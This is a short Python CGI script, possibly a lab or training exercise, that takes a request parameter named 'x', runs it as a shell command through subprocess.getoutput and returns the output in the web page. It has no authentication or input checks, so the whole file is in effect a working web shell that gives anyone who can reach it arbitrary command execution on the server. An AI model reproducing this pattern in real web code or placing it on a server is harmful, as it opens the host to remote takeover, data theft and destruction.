#!/usr/bin/python3
import cgi
import subprocess

print("content-type: text/html")
print()

mydata = cgi.FieldStorage()
cmd = mydata.getvalue("x")
output = subprocess.getoutput(cmd)

print(output)
